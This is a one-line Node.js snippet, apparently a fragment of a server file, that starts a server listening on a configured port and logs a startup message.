server.listen(PORT, () => console.log(`Server running on ${PORT}`));
